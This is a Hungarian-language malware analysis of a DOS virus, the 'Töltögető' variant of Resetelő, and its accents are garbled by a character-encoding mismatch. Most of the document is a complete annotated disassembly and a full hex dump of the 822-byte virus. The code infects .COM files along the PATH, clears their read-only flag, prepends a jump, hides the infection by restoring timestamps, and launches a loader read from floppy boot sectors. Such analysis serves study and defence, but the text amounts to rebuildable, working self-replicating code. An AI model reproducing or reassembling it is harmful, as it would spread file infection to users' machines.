

                    A Resetel” v¡rus T”lt”get” f‚le mut nsa
                    ***************************************


A Resetel” v¡russal teljes eg‚sz‚ben megegyezik a fert”z” mechanizmus.
Eltekintve att¢l, hogy ez a mut ns nem tesz t”nkre f jlokat. Az adatterlet is
ugyanazon a c¡men van, ¡gy ugyan£gy lehet ¡rtani, mint a Resetel”t. A v ltoz s:
a v¡rus hossza 822 byte, minden ind¡t s ut n az A:-r¢l megpr¢b lja beolvasni a
BOOT-ot, majd a 40/80-dik s vot. Ha valamelyik T”lt”get”vel fert”z”tt, akkor
elind¡tja a T”lt”get”t !


       ;Ide (0100-ra) mutat a file elej‚r”l az ugr¢ utas¡t s.

       ;Els” feladat: az els” 3 byte vissza¡r sa az eredetire.

0100 51            PUSH   CX      ;CX a stacken marad mindv‚gig.
       ;A k”vetkez”  utas¡t s  operandus t ( jelen esetben 02F9-et )
       ;fert”z‚skor   ll¡tja be , ¡gy  mindig  a helyes c¡mre mutat.
0101 BAF902        MOV    DX,02F9 ;Eredeti els” 3 byte c¡me-10h
0104 FC            CLD            ;( ERE_DTA_OFS)
0105 8BF2          MOV    SI,DX
0107 81C60A00      ADD    SI,000A ;SI=offset ERE_KEZD
010B BF0001        MOV    DI,0100 ;Program eleje
010E B90300        MOV    CX,0003 ;3 byte
0111 F3            REPZ
0112 A4            MOVSB          ;Az eredeti byteok vissza ll¡t sa


       ;-----------------------------------------
       ;            Install ci¢s r‚sz:
       ;-----------------------------------------

       ;DOS verzi¢ lek‚rdez‚se. 1.00-n l kisebb verzi¢n l az eredeti
       ;program futtat sa: ekkor a v¡rus nem mk”dik.

0113 8BF2          MOV    SI,DX   ;Ezut n SI-ben az adatterlet c¡me
0115 B430          MOV    AH,30
0117 CD21          INT    21      ;DOS verzi¢ lek‚rdez‚se
0119 3C00          CMP    AL,00   ;Csak 1.00-n l kisebbn‚l l‚p ki
011B 7503          JNZ    0120
011D E9C701        JMP    02E7    ;Eredeti program futtat sa


       ;Disk Transzfer Address lek‚rdez‚se, elment‚se

0120 06            PUSH   ES
0121 B42F          MOV    AH,2F
0123 CD21          INT    21      ;DTA leolvas sa (ES:BX), meg”rz‚se
0125 899C0000      MOV    [SI+0000],BX ;ERE_DTA_OFS (02F9)
0129 8C840200      MOV    [SI+0002],ES ;ERE_DTA_SEG (02FB)

       ;-------------------------------------------------------
       ;             A beiktatott beh£z¢ r‚sz
       ;-------------------------------------------------------

012D E85802        CALL    0388
0130 07            POP     ES

       ;DTA be ll¡t sa ENTRY c¡m‚re (0358). Igy a FindFirst, FindNext
       ;DOS funkci¢k ide fogj k m solni a file adatait (nev‚t,idej‚t,
       ;hossz t,stb).

0131 BA5F00        MOV    DX,005F
       ;{Val¢sz¡nleg r‚gi assemblerrel ¡rt k a v¡rust, ez‚rt van itt
       ;egy NOP utas¡t s.}
0134 90            NOP
0135 03D6          ADD    DX,SI
0137 B41A          MOV    AH,1A
0139 CD21          INT    21      ;DTA  ll¡t sa DS:DX-re: ENTRY(0358)


       ;A PATH-ok c¡m‚nek megkeres‚se. Ha az aktu lis k”nyvt rban m r
       ;mindegyik  filet megfert”zte , itt taj lja meg azoknak az al-
       ;k”nyvt raknak a nev‚t , amelyekben m‚g megfert”zend” fileokat
       ;tal lhat.

013B 06            PUSH   ES
013C 56            PUSH   SI
013D 8E062C00      MOV    ES,[002C];Environment (k”rnyezet)  segmense
0141 BF0000        MOV    DI,0000  ;ES:DI  fog   a  megfelel”  helyre
                                   ;(a k”vetkez” directoryra) mutatni


       ;A k”vetkez” r‚sz a  PATH= sz”veget  keresi meg az environment
       ;terleten:

0144 5E            POP    SI
0145 56            PUSH   SI
0146 81C61A00      ADD    SI,001A ;STR_PATH (0313)
014A AC            LODSB          ;AL=DS:[SI],SI++
014B B90080        MOV    CX,8000 ;max 32k az environment
014E F2            REPNZ
014F AE            SCASB          ;AL-ES:[DI] Megkeresi a k”vetkez”
                                  ;'P' bett
0150 B90400        MOV    CX,0004 ;M‚g 4 bet azonos¡t sa
0153 AC            LODSB          ;AL=DS:[SI],SI++
0154 AE            SCASB          ;AL-ES:[DI],DI++
0155 75ED          JNZ    0144    ;Ugr s, ha a k”vetkez” 4 bet nem
                                  ;egyezik (nem 'ATH=')
0157 E2FA          LOOP   0153
0159 5E            POP    SI      ;ES:DI mutat az els” PATH-ra
015A 07            POP    ES
015B 89BC1600      MOV    [SI+0016],DI ;PATH_MUT (030F)


015F 8BFE          MOV    DI,SI   ;{Hogy  ez  minek ?  K‚s”bb  £gyis
0161 81C71F00      ADD    DI,001F ;fell¡rja}  FILE_PATH (0318)
0165 8BDE          MOV    BX,SI   ;Ezut n BX mutat az adatokra
0167 81C61F00      ADD    SI,001F ;SI is a FILE_PATH-ra(0318) mutat
016B 8BFE          MOV    DI,SI   ;{Az el”bb m r be llitotta (?)}
016D EB3A          JMP    01A9


       ;A k”vetkez” PATH-ban  megadott aldirectoryt  FILE_PATH-ra m -
       ;solja. Igy a  k”vetkez” fileokat  m r ebben az aldirectoryban
       ;fogja keresni.

016F 83BC160000    CMP    WORD PTR [SI+0016],+00 ;PATH_MUT (030F)
0174 7503          JNZ    0179
0176 E96001        JMP    02D9    ;Ugr s, ha nincs t”bb PATH aldir.
                                  ;(mindet megfert”te m r)
0179 1E            PUSH   DS
017A 56            PUSH   SI
017B 26            ES:
017C 8E1E2C00      MOV    DS,[002C] ;Environment segmense
0180 8BFE          MOV    DI,SI   ;(02F9)
0182 26            ES:
0183 8BB51600      MOV    SI,[DI+0016] ;PATH_MUT (030F)
0187 81C71F00      ADD    DI,001F ;FILE_PATH c¡me (0318)
018B AC            LODSB          ;AL=DS:[SI]  SI++
018C 3C3B          CMP    AL,3B   ;';'
018E 740A          JZ     019A
0190 3C00          CMP    AL,00
0192 7403          JZ     0197
0194 AA            STOSB          ;ES:[DI]:=AL  DI++
0195 EBF4          JMP    018B    ;tm sol s ';' vagy #0-ig

       ;#0-val z rult a PATH bejegyz‚s => nem lesz t”bb
0197 BE0000        MOV    SI,0000
019A 5B            POP    BX      ;Ezut n BX mutat az adatokra
019B 1F            POP    DS
019C 89B71600      MOV    [BX+0016],SI ;PATH_MUT (030F) = 0
                                       ;( Nincs t”bb PATH jelz‚s )

       ;A k”vetkez” PATH-ban adott aldir. m r  tm solva.
01A0 807DFF5C      CMP    BYTE PTR [DI-01],5C
01A4 7403          JZ     01A6    ;Ugr s, ha az ut¢ls¢ bet a '\'
01A6 B05C          MOV    AL,5C   ;Egy‚bk‚nt '\' ¡r s
01A8 AA            STOSB          ;ES:[DI]:=AL  DI++




       ;Egy  aldirectory ki‚rt‚kel‚se . El”sz”r  az aktu lis , majd a
       ;FILE_PATH -ra m solt aldirectory v‚gign‚z‚se, fert”z‚s.
       ;DI a FILE_PATH-ba ¡rt aldirectory neve ut ni pozici¢ra mutat.


       ;A COM kiterjeszt‚s fileok megkeres‚se:

01A9 89BF1800      MOV    [BX+0018],DI ;FILE_NEV_MUT (0311)
                                       ;Ide  kell majd  a file  nev‚t
                                       ;m solni (az aldir. neve ut n)
01AD 8BF3          MOV    SI,BX   ;(02F9)
01AF 81C61000      ADD    SI,0010 ;KERES_STR (0309)
01B3 B90600        MOV    CX,0006 ;6 bet  tm sol sa ('*.COM',0)
01B6 F3            REPZ           ;A  PATH-ban  megadott  aldirectory
01B7 A4            MOVSB          ;m”g‚ , ¡gy  teljes keres‚si  utunk
                                  ;lesz
01B8 8BF3          MOV    SI,BX   ;(02F9)
01BA B44E          MOV    AH,4E   ;FIND FIRST ENTRY
01BC BA1F00        MOV    DX,001F
01BF 90            NOP
01C0 03D6          ADD    DX,SI   ;FILE_PATH (0318)
01C2 B90300        MOV    CX,0003 ;HIDDEN, READ ONLY
01C5 CD21          INT    21      ;Az  els”   COM  kiterjeszt‚s file
                                  ;megkeres‚se . A file adatait a DTA
                                  ; ltal  mutatott c¡mre (ENTRY 0358)
                                  ;m solja.
01C7 EB04          JMP    01CD


       ;K”vetkez” COM file keres‚se (adatai ENTRY-re kerlnek).

01C9 B44F          MOV    AH,4F   ;FIND NEXT
01CB CD21          INT    21
01CD 7302          JNB    01D1
01CF EB9E          JMP    016F    ;Ha  nem tal l  t”bb COM filet : —j
                                  ;aldirt keres a PATH-ban


       ;M r tal lt COM filet. Adataival az ENTRY fel van t”ltve.Ennek
       ;a filenak az ellen”rz‚se, fert”z‚se k”vetkezik.

       ;Annak ellen”rz‚se , hogy a file megfert”zhet”-e (fert”z”tt-e,
       ;t£l hossz£-e, t£l r”vid-e) . Ha nem fert”zhet” visszaugrik £j
       ;fileokat keresni.

01D1 8B847500      MOV    AX,[SI+0075] ;ENT_IDO (036E) A file ideje
01D5 241F          AND    AL,1F
01D7 3C1F          CMP    AL,1F   ;Ugr s, ha az als¢ 5 bit 1-es:
01D9 74EE          JZ     01C9    ;a file m r fert”z”tt.
01DB 81BC790000FA  CMP    WORD PTR [SI+0079],FA00   ;ENT_HOSSZ (0372)
01E1 77E6          JA     01C9    ;Ugr s, ha file hossza nagyobb,mint
                                  ;64000h (m r nem f‚r bele a v¡rus)
01E3 83BC79000A    CMP    WORD PTR [SI+0079],+0A    ;ENT_HOSSZ (0372)
01E8 72DF          JB     01C9    ;Ugr s, ha r”videbb 10h byten l


       ;-----------------------------------------
       ;       Megvan a kiv laszott file.
       ;-----------------------------------------

       ;A file nev‚t  az aldirectory neve  ut n kell m solni , hogy a
       ;teljes £t rendelkez‚snkre  lljon , ¡gy majd meg tudja nyitni
       ;a filet.
01EA 8BBC1800      MOV    DI,[SI+0018] ;FILE_NEV_MUT (0311) Ide fogja
01EE 56            PUSH   SI      ;a file nev‚t m solni
01EF 81C67D00      ADD    SI,007D ;ENT_NEV (0376)

01F3 AC            LODSB          ;AL:=DS:[SI] SI++
01F4 AA            STOSB          ;ES:[DI]:=AL DI++   (M sol s)
01F5 3C00          CMP    AL,00   ;N‚vlez r¢ 0-ig m sol
01F7 75FA          JNZ    01F3
01F9 5E            POP    SI      ;SI £jra az adatokra mutat


       ;A file egyes eredeti inform ci¢inak meg”rz‚se , hogy a fert”-
       ;z‚s ne tnj”n fel.

       ;Az eredeti attributtum meg”rz‚se:

       ;{Fogalmam sincs mi‚rt  kell  a file attributtum t m‚g egyszer
       ;lek‚rdezni , amikor az ENTRY terleten megtal lhat¢ . Tal n a
       ;v¡rus ¡r¢ja nem tudta?}
01FA B80043        MOV    AX,4300 ;File attributtum nak lek‚rdez‚se
01FD BA1F00        MOV    DX,001F ;FILE_PATH ([SI+1F] 0318)
0200 90            NOP            ;{piszok}
0201 03D6          ADD    DX,SI   ;DS:DX mutat a file £tj ra
0203 CD21          INT    21      ;CX-ben az attributtum
0205 898C0800      MOV    [SI+0008],CX ;ERE_ATTR (0301)


       ;A file ¡r sv‚delm‚nek t”rl‚se:

0209 B80143        MOV    AX,4301 ;File attributtum nak  llit sa
020C 81E1FEFF      AND    CX,FFFE ;Read Only jelz‚s t”rl‚se
0210 BA1F00        MOV    DX,001F ;{ Az el”bb m r  be ll¡totta, minek
0213 90            NOP            ;£jra? }
0214 03D6          ADD    DX,SI   ;FILE_PATH (0318)
0216 CD21          INT    21


       ;File megnyit sa:

0218 B8023D        MOV    AX,3D02 ;File megnyit sa ¡r sra, olvas sra
021B BA1F00        MOV    DX,001F ;{M‚g egyszer be ll¡tja!}
021E 90            NOP            ;{piszok}
021F 03D6          ADD    DX,SI   ;FILE_PATH (0318)
0221 CD21          INT    21
0223 7303          JNB    0228
0225 E9A200        JMP    02CA    ;Hib n l: nincs fert”z‚s
0228 8BD8          MOV    BX,AX   ;Handle


       ;A file eredeti (mostani) idej‚nek lek‚rdez‚se:

       ;{Ez is megtal lhat¢ lenne az ENTRY terleten!}
022A B80057        MOV    AX,5700 ;Get Date & Time
022D CD21          INT    21
022F 898C0400      MOV    [SI+0004],CX ;ERE_TIME (02FD)
0233 89940600      MOV    [SI+0006],DX ;ERE_DATE (02FF)


       ;Annak eld”nt‚se , hogy  a kiv lasztott  filet t”nkretegye-e ,
       ;vagy megfert”zze . Lek‚rdezi  a jelenlegi id”t , ‚s ha m sod-
       ;perceinek sz ma 8-cal oszthat¢ , akkor a filet resetel”v‚ te-
       ;szi, egy‚bk‚nt pedig megfert”zi. Igy az esetek 2/15-”d r‚sz‚-
       ;ben teszi csak t”nkre a filet.

0237 B42C          MOV    AH,2C   ;A mostani id” lek‚rdez‚se
0239 CD21          INT    21
023B 80E607        AND    DH,07   ;A m sodpercek als¢ 3 bitje
023E EB0D          JMP    024D    ;Fert”z‚s
0240 90            NOP


       ;      Szem‚t a Reselet”lb”l

0241 B440          MOV     AH,40
0243 B90500        MOV     CX,0005
0246 8BD6          MOV     DX,SI
0248 81C28A00      ADD     DX,008A
024C 90            NOP

       ;-----------------------------------------
       ;                Fert”z‚s:
       ;-----------------------------------------


       ;Az eredeti file  els” 3 bytej nak meg”rz‚se , hogy k‚s”bb m‚g
       ;futtatni lehessen.
024D B43F          MOV    AH,3F   ;Olvas s fileb¢l
024F B90300        MOV    CX,0003 ;Az els” 3 byte beolvas sa
0252 BA0A00        MOV    DX,000A
0255 90            NOP            ;{piszok}
0256 03D6          ADD    DX,SI   ;ERE_KEZD (0303)
0258 CD21          INT    21
025A 7255          JB     02B1    ;Hib n l v‚ge
025C 3D0300        CMP    AX,0003
025F 7550          JNZ    02B1    ;Hib n l v‚ge


       ;File v‚g‚re  ll s, az £j c¡mek kisz m¡t sa:

0261 B80242        MOV    AX,4202 ;File Pointer file v‚g‚re  ll¡t sa
0264 B90000        MOV    CX,0000
0267 BA0000        MOV    DX,0000
026A CD21          INT    21
026C 7243          JB     02B1    ;{Itt nem nagyon lehet hiba!}


       ;A file elej‚re irand¢ JMP operandus nak kisz m¡t sa:

026E 8BC8          MOV    CX,AX   ;AX-ben a file hossza
0270 2D0300        SUB    AX,0003 ;AX-ben az eltol s  a JMP utas¡t s-
                                  ;hoz, ahhoz amit a file elej‚re fog
                                  ;majd ¡rni . Igy  ez a  JMP a  file
                                  ;mostani v‚ge ut ni  bytera fog mu-
                                  ;tatni.
0273 89840E00      MOV    [SI+000E],AX ;CIM_JMP (0307)


       ;Az £j fileon belli adatterlet  c¡m‚nek kisz m¡t sa ‚s be l-
       ;l¡t sa:

0277 81C1F902      ADD    CX,02F9 ;CX az £j fileon belli adatter-
027B 8BFE          MOV    DI,SI   ;letre mutat.
027D 81EFF701      SUB    DI,01F7 ;A v¡rus els” utas¡t s nak (MOV DX,
                                  ;02F9) operandus nak c¡me.
0281 890D          MOV    [DI],CX ;Ide ¡rja az adatterlet c¡m‚t


       ;-----------------------------------------
       ;  A v¡rus hozz m solja mag t a filehoz:
       ;-----------------------------------------

       ;(A filemutat¢ a file v‚g‚re mutat.)
0283 B440          MOV    AH,40   ;Ir s fileba.
0285 B93603        MOV    CX,0336 ;822 byte (a v¡rus hossza)
0288 8BD6          MOV    DX,SI
028A 81EAF901      SUB    DX,01F9 ;DX a v¡rus els” bytej ra mutat
028E CD21          INT    21
0290 721F          JB     02B1    ;Hib n l v‚ge
0292 3D3603        CMP    AX,0336
0295 751A          JNZ    02B1    ;Ha nem ¡rta ki mind a 648 byteot


       ;Az els” 3 byte  t ll¡t sa, egy a file v‚g‚re mutat¢ ugr¢ uta-
       ;s¡t sra:

0297 B80042        MOV    AX,4200 ;A file pointer a file elej‚re!
029A B90000        MOV    CX,0000
029D BA0000        MOV    DX,0000
02A0 CD21          INT    21
02A2 720D          JB     02B1    ;{Itt sem lehet hiba!}

02A4 B440          MOV    AH,40   ;Ir s fileba
02A6 B90300        MOV    CX,0003 ;3 byte
02A9 8BD6          MOV    DX,SI
02AB 81C20D00      ADD    DX,000D ;B_JMP (0306) DX az ugr¢ utas¡t sra
02AF CD21          INT    21      ;mutat


       ;Az eredeti id” ( m r a fert”z‚sjelz‚ssel egytt ) vissza ll¡-
       ;t sa:

02B1 8B940600      MOV    DX,[SI+0006] ;ERE_DATE (02FF)
02B5 8B8C0400      MOV    CX,[SI+0004] ;ERE_TIME (027D)
02B9 81E1E0FF      AND    CX,FFE0      ;{Teljesen felesleges!}
02BD 81C91F00      OR     CX,001F      ;M r volt fert”zve jelz‚s
02C1 B80157        MOV    AX,5701      ;Set Date & Time
02C4 CD21          INT    21


       ;A file lez r sa:

02C6 B43E          MOV    AH,3E   ;Close Handle
02C8 CD21          INT    21


       ;Az eredeti attributtum vissza ll¡t sa:

02CA B80143        MOV    AX,4301 ;Set File Attributtum
02CD 8B8C0800      MOV    CX,[SI+0008] ;ERE_ATTR (0301)
02D1 BA1F00        MOV    DX,001F
02D4 90            NOP
02D5 03D6          ADD    DX,SI   ;FILE_PATH (0318)
02D7 CD21          INT    21


       ;DTA vissza ll¡t sa az eredeti c¡mre:

02D9 1E            PUSH   DS
02DA B41A          MOV    AH,1A   ;Set DTA
02DC 8B940000      MOV    DX,[SI+0000] ;ERE_DTA_OFS (02F9)
02E0 8E9C0200      MOV    DS,[SI+0002] ;ERE_DTA_SEG (02FB)
02E4 CD21          INT    21
02E6 1F            POP    DS


       ;-----------------------------------------
       ;      Az eredeti program futtat sa:
       ;-----------------------------------------

02E7 59            POP    CX      ;CX vissza ll¡t sa
02E8 33C0          XOR    AX,AX   ;Regiszterek null z sa
02EA 33DB          XOR    BX,BX
02EC 33D2          XOR    DX,DX
02EE 33F6          XOR    SI,SI
02F0 BF0001        MOV    DI,0100
02F3 57            PUSH   DI      ;0100 a stackre
02F4 33FF          XOR    DI,DI
02F6 C2FFFF        RET    FFFF    ;100-on folytat¢dik a vez‚rl‚s
                                  ;SP-- {Hogy minek?}



       ;-----------------------------------------
       ;               ADAT TERšLET
       ;-----------------------------------------


       ;Ide mutat (02F9-re) a v¡rus elej‚n DX, k‚s”bb SI,BX.

02F9 ERE_DTA_OFS   DW     (?)       ;[SI+00] Eredeti DTA c¡me
02FB ERE_DTA_SEG   DW     (?)       ;[SI+02]

02FD ERE_TIME      DW     (?)       ;[SI+04] A file eredeti ideje,
02FF ERE_DATE      DW     (?)       ;[SI+06] d tuma,
0301 ERE_ATTR      DW     (?)       ;[SI+08] attributtuma

0303 ERE_KEZD      DB     3 DUP (?) ;[SI+0A]
                                    ;A file eredeti els” 3 byteja.

       ;A k”vetkez” 3 byteon lesz az a 3 byte , amit a v¡rus egy meg-
       ;fert”zend” file elej‚re fog ¡rni.

0306 B_JMP         DB     E9        ;[SI+0D]
                                    ;JMP g‚pik¢dja
0307 CIM_JMP       DW     (?)       ;Eltol s (JMP operandusa)

0309 KERES_STR     DB     '*.COM',0 ;[SI+10]
                                    ;Ezt a stringet m solja a
                                    ;FILE_NEV_MUT c¡mre

030F PATH_MUT      DW     (?)       ;[SI+16]
                                    ;Hol a k”vetkez” aldirectory neve
                                    ;az environmenten.

0311 FILE_NEV_MUT  DW     (?)       ;[SI+18]
                                    ;Az  tm solt aldirectory m”g‚ mu-
                                    ;tat.
                                    ;Azt  mutatja , hogy hova  kell a
                                    ;keres‚si stringet(*.COM), majd a
                                    ;file nev‚t  m solni a FILE_PATH-
                                    ;on bell ahhoz, hogy teljes utat
                                    ;kapjunk.

0313 STR_PATH      DB     'PATH='   ;[SI+1A] Ezt a stringet keresi az
                                    ;environment terleten.

0318 FILE_PATH     DB     40 DUP (?);[SI+1F]
                                    ;Itt lesz  majd a keres‚si string
                                    ;‚s a fert”zend”  file neve £ttal
                                    ;egytt.


       ;Ide mutat a DTA. Ezt a terletet fogja a DOS a file adataival
       ;felt”lteni.

0358 ENTRY         DB     15 DUP (?);Fenntartott         [SI+5F]
036D ENT_ATTR      DB     (?)       ;Attributtum         [SI+74]
036E ENT_IDO       DW     (?)       ;Keletkez‚s ideje    [SI+75]
0370 ENT_DATUM     DW     (?)       ;Keletkez‚s d tuma   [SI+77]
0372 ENT_HOSSZ     DW     (?)       ;Als¢ sz¢            [SI+79]
0374               DW     (?)       ;Fels” sz¢           [SI+7B]
0376 ENT_NEV       DB     0D DUP (?);Megtal lt file neve [SI+7D]

0383 RESET         DB     EA,F0,FF,00,F0 ;JMP  F000:FFF0 [SI+8A]
                                    ;Nem haszn lja

       ;----------------------------------------------------
       ;              A T”lt”get”t beh£z¢ r‚sz
       ;----------------------------------------------------


0388 50            PUSH   AX      ;Regiszterek elment‚se
0389 53            PUSH   BX
038A 51            PUSH   CX
038B 52            PUSH   DX
038C 06            PUSH   ES
038D 1E            PUSH   DS
038E 57            PUSH   DI
038F 56            PUSH   SI
0390 E80000        CALL   0393    ;Lebuk s !! (/g)
0393 5B            POP    BX      ;BX=0393

       ;A: BOOT beolvas sa/T”lt”get” lek‚rdez‚se

0394 BEA55A        MOV    SI,5AA5 ;T”lt”get” lek‚rdez‚se
0397 BFAA55        MOV    DI,55AA
039A 0E            PUSH   CS
039B 07            POP    ES
039C 81C3E803      ADD    BX,03E8 ;BX=077B
03A0 81FBE803      CMP    BX,03E8
03A4 7303          JNB    03A9
03A6 E98200        JMP    042B    ;Ha nincs el‚g szabad mem¢ria a szegmensen
03A9 53            PUSH   BX
03AA B80102        MOV    AX,0201 ;A:BOOT beolvas sa
03AD BA0000        MOV    DX,0000
03B0 B90100        MOV    CX,0001
03B3 CD13          INT    13
03B5 5B            POP    BX
03B6 7308          JNB    03C0
03B8 80FC06        CMP    AH,06   ;Ha lemezcsere volt, az nem hiba
03BB 74EC          JZ     03A9
03BD EB6C          JMP    042B    ;Val¢di hiba->v‚ge
03BF 90            NOP
03C0 81FE5AA5      CMP    SI,A55A
03C4 7465          JZ     042B    ;V‚ge, ha a T”lt”get” m r a mem¢ri ban van

       ;Van-e el‚g szabad mem¢ria a T”lt”get” beolvas s hoz

03C6 8CC8          MOV    AX,CS
03C8 050010        ADD    AX,1000
03CB 53            PUSH   BX
03CC 50            PUSH   AX
03CD CD12          INT    12      ;Max mem.
03CF BB4000        MOV    BX,0040
03D2 F7E3          MUL    BX      ;AX-ben a mem¢ria tetej‚nek szegmense
03D4 2D0010        SUB    AX,1000 ;legal bb 4Kb kell a T”lt”get”nek
03D7 8BD8          MOV    BX,AX
03D9 58            POP    AX      ;CS+1000
03DA 3BD8          CMP    BX,AX
03DC 7304          JNB    03E2
03DE 5B            POP    BX
03DF EB4A          JMP    042B    ;V‚ge, ha nincs el‚g szabad mem¢ria
03E1 90            NOP

       ;       A lemez ut¢ls¢ s vj nak megkeres‚se

03E2 5B            POP    BX      ;BX=077B
03E3 8EC0          MOV    ES,AX   ;Max mem-1000
03E5 2E            CS:
03E6 8B4718        MOV    AX,[BX+18]  ;S v hossza
03E9 2E            CS:
03EA 8B4F1A        MOV    CX,[BX+1A]  ;Oldalak sz ma
03ED F7E1          MUL    CX
03EF 8BC8          MOV    CX,AX   ;Egy cilinder nagys ga
03F1 2E            CS:
03F2 8B4713        MOV    AX,[BX+13]  ;Szektorok sz ma
03F5 BA0000        MOV    DX,0000
03F8 F7F1          DIV    CX      ;Osztva a cilinder nagys g val AL-ben a s v

       ;              Az ut¢ls¢ s v beolvas sa

03FA 81EBE803      SUB    BX,03E8 ;BX=0393
03FE 53            PUSH   BX
03FF 8AE8          MOV    CH,AL   ;40/80-dik s v
0401 B101          MOV    CL,01
0403 BB0001        MOV    BX,0100 ;ES:BX-re olvas !
0406 BA0000        MOV    DX,0000
0409 B80802        MOV    AX,0208 ;8 szektor beolvas sa
040C CD13          INT    13
040E 5B            POP    BX
040F 721A          JB     042B    ;Hib n l v‚ge

       ;             Ha a T”lt”get”t tal l, elind¡tja

0411 53            PUSH   BX
0412 BB0001        MOV    BX,0100
0415 26            ES:
0416 8B07          MOV    AX,[BX]
0418 3D5224        CMP    AX,2452 ;Azonos¡t¢
041B 5B            POP    BX
041C 750D          JNZ    042B    ;Ha nem T”lt”get”
041E 8BC3          MOV    AX,BX
0420 059800        ADD    AX,0098 ;AX=042B (A visszat‚r‚sre mutat)
0423 0E            PUSH   CS
0424 50            PUSH   AX
0425 B80A01        MOV    AX,010A ;T”lt”get” bel‚p‚si pontja
0428 06            PUSH   ES
0429 50            PUSH   AX
042A CB            RETF

       ;                    Visszat‚r‚s

042B 5E            POP    SI      ;Regiszterek vissza
042C 5F            POP    DI
042D 1F            POP    DS
042E 07            POP    ES
042F 5A            POP    DX
0430 59            POP    CX
0431 5B            POP    BX
0432 58            POP    AX
0433 C3            RET
0434 0000          DW     0000    ;???


                             A v¡rus hexa dumpja :


0100  51 BA F9 02 FC 8B F2 81-C6 0A 00 BF 00 01 B9 03   Q...............
0110  00 F3 A4 8B F2 B4 30 CD-21 3C 00 75 03 E9 C7 01   ......0.!<.u....
0120  06 B4 2F CD 21 89 9C 00-00 8C 84 02 00 E8 58 02   ../.!.........X.
0130  07 BA 5F 00 90 03 D6 B4-1A CD 21 06 56 8E 06 2C   .._.......!.V..,
0140  00 BF 00 00 5E 56 81 C6-1A 00 AC B9 00 80 F2 AE   ....^V..........
0150  B9 04 00 AC AE 75 ED E2-FA 5E 07 89 BC 16 00 8B   .....u...^......
0160  FE 81 C7 1F 00 8B DE 81-C6 1F 00 8B FE EB 3A 83   ..............:.
0170  BC 16 00 00 75 03 E9 60-01 1E 56 26 8E 1E 2C 00   ....u..`..V&..,.
0180  8B FE 26 8B B5 16 00 81-C7 1F 00 AC 3C 3B 74 0A   ..&.........<;t.
0190  3C 00 74 03 AA EB F4 BE-00 00 5B 1F 89 B7 16 00   <.t.......[.....
01A0  80 7D FF 5C 74 03 B0 5C-AA 89 BF 18 00 8B F3 81   .}.\t..\........
01B0  C6 10 00 B9 06 00 F3 A4-8B F3 B4 4E BA 1F 00 90   ...........N....
01C0  03 D6 B9 03 00 CD 21 EB-04 B4 4F CD 21 73 02 EB   ......!...O.!s..
01D0  9E 8B 84 75 00 24 1F 3C-1F 74 EE 81 BC 79 00 00   ...u.$.<.t...y..
01E0  FA 77 E6 83 BC 79 00 0A-72 DF 8B BC 18 00 56 81   .w...y..r.....V.
01F0  C6 7D 00 AC AA 3C 00 75-FA 5E B8 00 43 BA 1F 00   .}...<.u.^..C...
0200  90 03 D6 CD 21 89 8C 08-00 B8 01 43 81 E1 FE FF   ....!......C....
0210  BA 1F 00 90 03 D6 CD 21-B8 02 3D BA 1F 00 90 03   .......!..=.....
0220  D6 CD 21 73 03 E9 A2 00-8B D8 B8 00 57 CD 21 89   ..!s........W.!.
0230  8C 04 00 89 94 06 00 B4-2C CD 21 80 E6 07 EB 0D   ........,.!.....
0240  90 B4 40 B9 05 00 8B D6-81 C2 8A 00 90 B4 3F B9   ..@...........?.
0250  03 00 BA 0A 00 90 03 D6-CD 21 72 55 3D 03 00 75   .........!rU=..u
0260  50 B8 02 42 B9 00 00 BA-00 00 CD 21 72 43 8B C8   P..B.......!rC..
0270  2D 03 00 89 84 0E 00 81-C1 F9 02 8B FE 81 EF F7   -...............
0280  01 89 0D B4 40 B9 36 03-8B D6 81 EA F9 01 CD 21   ....@.6........!
0290  72 1F 3D 36 03 75 1A B8-00 42 B9 00 00 BA 00 00   r.=6.u...B......
02A0  CD 21 72 0D B4 40 B9 03-00 8B D6 81 C2 0D 00 CD   .!r..@..........
02B0  21 8B 94 06 00 8B 8C 04-00 81 E1 E0 FF 81 C9 1F   !...............
02C0  00 B8 01 57 CD 21 B4 3E-CD 21 B8 01 43 8B 8C 08   ...W.!.>.!..C...
02D0  00 BA 1F 00 90 03 D6 CD-21 1E B4 1A 8B 94 00 00   ........!.......
02E0  8E 9C 02 00 CD 21 1F 59-33 C0 33 DB 33 D2 33 F6   .....!.Y3.3.3.3.
02F0  BF 00 01 57 33 FF C2 FF-FF 80 00 57 0B 96 01 21   ...W3......W...!
0300  00 20 00 E9 00 00 E9 FD-0F 2A 2E 43 4F 4D 00 71   . .......*.COM.q
0310  07 21 07 50 41 54 48 3D-54 45 53 5A 54 2E 43 4F   .!.PATH=TESZT.CO
0320  4D 00 4F 4D 00 20 20 20-20 20 20 20 20 20 20 20   M.OM.
0330  20 20 20 20 20 20 20 20-20 20 20 20 20 20 20 20
0340  20 20 20 20 20 20 20 20-20 20 20 20 20 20 20 20
0350  20 20 20 20 20 20 20 20-03 3F 3F 3F 3F 3F 3F 3F           .???????
0360  3F 43 4F 4D 03 03 00 4B-09 A1 7D 73 6F 20 96 01   ?COM...K..}so ..
0370  21 00 00 10 00 00 54 45-53 5A 54 2E 43 4F 4D 00   !.....TESZT.COM.
0380  4F 4D 00 EA F0 FF 00 F0-50 53 51 52 06 1E 57 56   OM......PSQR..WV
0390  E8 00 00 5B BE A5 5A BF-AA 55 0E 07 81 C3 E8 03   ...[..Z..U......
03A0  81 FB E8 03 73 03 E9 82-00 53 B8 01 02 BA 00 00   ....s....S......
03B0  B9 01 00 CD 13 5B 73 08-80 FC 06 74 EC EB 6C 90   .....[s....t..l.
03C0  81 FE 5A A5 74 65 8C C8-05 00 10 53 50 CD 12 BB   ..Z.te.....SP...
03D0  40 00 F7 E3 2D 00 10 8B-D8 58 3B D8 73 04 5B EB   @...-....X;.s.[.
03E0  4A 90 5B 8E C0 2E 8B 47-18 2E 8B 4F 1A F7 E1 8B   J.[....G...O....
03F0  C8 2E 8B 47 13 BA 00 00-F7 F1 81 EB E8 03 53 8A   ...G..........S.
0400  E8 B1 01 BB 00 01 BA 00-00 B8 08 02 CD 13 5B 72   ..............[r
0410  1A 53 BB 00 01 26 8B 07-3D 52 24 5B 75 0D 8B C3   .S...&..=R$[u...
0420  05 98 00 0E 50 B8 0A 01-06 50 CB 5E 5F 1F 07 5A   ....P....P.^_..Z
0430  59 5B 58 C3 00 00                                 Y[X...
